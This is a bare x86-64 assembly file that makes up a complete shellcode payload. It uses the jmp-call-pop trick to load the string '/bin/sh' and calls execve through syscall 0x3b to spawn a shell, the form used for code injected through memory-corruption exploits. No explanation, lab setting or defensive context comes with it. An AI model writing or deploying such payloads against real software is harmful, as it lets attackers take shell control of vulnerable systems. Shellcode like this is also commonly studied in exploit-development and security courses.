.intel_syntax noprefix
.global _start

_start:
    jmp call_exec_shell

exec_shell:
    pop rdi
    xor rax, rax
    mov al, 0x3b
    xor rsi, rsi
    xor rdx, rdx
    syscall

call_exec_shell:
    call exec_shell
    .string "/bin/sh"
